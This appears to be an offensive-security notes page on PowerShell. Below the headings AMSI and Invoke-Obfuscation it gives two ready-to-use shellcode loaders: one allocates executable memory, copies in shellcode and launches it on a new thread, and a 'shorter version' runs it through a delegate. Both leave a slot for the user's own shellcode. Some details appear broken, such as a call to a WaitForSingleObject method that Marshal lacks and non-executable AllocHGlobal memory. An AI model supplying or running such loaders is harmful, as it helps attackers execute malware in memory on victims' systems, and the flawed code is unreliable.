# Powershell

AMSI
Invoke-Obfuscastion
powershell shellcode loader (without amsi bypass)

```powershell
$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode

$code = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("msvcrt.dll", SetLastError=true)] public static extern IntPtr memcpy(IntPtr dest, byte[] src, uint count);
}
"@

Add-Type -TypeDefinition $code

# Allocate memory
$mem = [Win32]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)

# Copy shellcode to memory
[Win32]::memcpy($mem, $shellcode, $shellcode.Length)

# Create thread to execute shellcode
$thread = [Win32]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# Wait for thread to exit (optional)
[System.Runtime.InteropServices.Marshal]::WaitForSingleObject($thread, 0xFFFFFFFF)
```

Shorter version:

```powershell
$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode

# Allocate memory
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)

# Copy shellcode to memory
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $shellcode.Length)

# Create thread to execute shellcode
$thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [System.Threading.ThreadStart])

# Start the thread
$thread.Invoke()

# Wait for thread to exit (optional)
[System.Threading.Thread]::Sleep(-1)
```